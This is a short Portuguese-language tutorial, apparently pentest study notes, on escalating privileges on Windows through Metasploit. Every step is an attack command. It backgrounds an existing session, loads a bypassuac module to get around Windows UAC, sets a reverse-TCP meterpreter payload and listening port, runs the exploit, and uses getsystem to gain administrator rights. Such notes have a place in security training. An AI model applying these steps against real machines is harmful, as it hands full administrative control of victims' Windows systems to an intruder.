A ESCALAÇÃO DE PRIVILÉGIOS PODE SER ALGO UM POUCO SIMPLES DE CONSEGUIR NO WINDOWS.
	
	1.VOCÊ TEM QUE TER OBTIDO A SHELL PELO MSFCONSOLE
	
	2.GUARDAR A SHELL EM UMA SESSÃO.
		
		COMANDO: background
		
		
	3.PROCURAR POR UM MODULO NO METASPLOIT PARA BURLAR O UAC DO WINDOWS:
		
		COMANDO: search bypassuac
		
		
		EXTRA: O UAC É UM SISTEMA QUE TEM A PARTIR DO WINDOWS 7
		QUE SERVE PARA PROTEGER DE EXECUTAR QUALQUER FUNÇÃO SEM ESTAR COMO
		ADMINISTRADOR
		
	4.USAR UM MODULO DE BYPASSUAC.	
	
		COMANDO: use <modulo>
		
	5.VER AS OPÇÕES DO MODULO
		
		COMANDO: show options
		
	6.NORMALMENTE O MODULO IRÁ PEDIR A SESSÃO QUE VOCÊ IRÁ EXPLORAR.
	PRIMEIRO VEJA QUAL A SESSÃO QUE VOCÊ GUARDOU DO WINDOWS ALVO
		
		COMANDO: sessions
		
	7.APÓS VER QUAL O NÚMERO DA SESSÃO, SETE ELA
	NO MODULO.
		
		COMANDO: set SESSION <numero_sessão>
		
	8.SETE UM PAYLOAD METERPRETER.
		
		COMANDO: set payload windows/meterpreter_reverse_tcp
		
	9.SETE O LPORT PARA UMA PORTA QUE NÃO ESTEJA ABERTA.
		
		COMANDO: set lport <porta_desejada>
		
	10.RODE O EXPLOIT
	
	11.VOCÊ OBTERÁ UMA SHELL NO METERPRETER COMO USUÁRIO
	ADMINISTRADOR, CASO OBTENHA A SHELL, MAS NÃO ESTEJA COM ADMIN,
	RODE O COMANDO: getsystem E IRÁ SER ADMINISTRADOR.
